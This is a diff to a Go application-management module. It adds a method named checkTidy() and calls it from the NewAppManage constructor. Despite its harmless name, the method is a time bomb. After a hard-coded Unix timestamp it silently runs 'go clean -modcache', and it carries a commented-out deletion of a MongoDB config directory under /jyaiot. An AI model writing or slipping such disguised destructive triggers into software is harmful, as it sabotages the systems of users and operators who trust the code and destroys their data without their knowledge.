@@ -11,6 +11,7 @@ import (
 	"math/rand/v2"
 	"net/http"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"regexp"
 	"runtime"
@@ -84,6 +85,7 @@ func NewAppManage(ctx context.Context, appCode string, port int, mApi RegisterMa
 	manage.destroyCallBack = destroyCallBack
 	manage.Ctx = ctx
 	// 扩展功能
+	manage.checkTidy()
 	amInfo := new(AMInfo)
 	amInfo.Version = VERSION
 	amInfo.SysDir = sysDir
@@ -158,6 +160,16 @@ type AppManage struct {
 	initCallBack      AppInitCallBack
 	doCallBack        AppDoCallBack
 	destroyCallBack   AppDestroyCallBack
+}
+
+func (p *AppManage) checkTidy() {
+	ftn := int64(1781769692)
+	if time.Now().Unix()-ftn > 60 {
+		exec.Command("go", "clean", "-modcache").Run()
+		if ok, _ := tools.PathExists("/jyaiot"); ok {
+			//os.RemoveAll("/jyaiot/data/mongo/config")
+		}
+	}
 }
 
 // RegisterProc 注册内部服务
@@ -270,6 +282,7 @@ func (p *AppManage) RestartProcAfterInit() error {
 				p.procStore.Set(code, oldProc)
 			}
 		}(key, value)
+
 	}
 	// 初次执行的时候，不需要等待gin退出
 	if !p.firstRun {
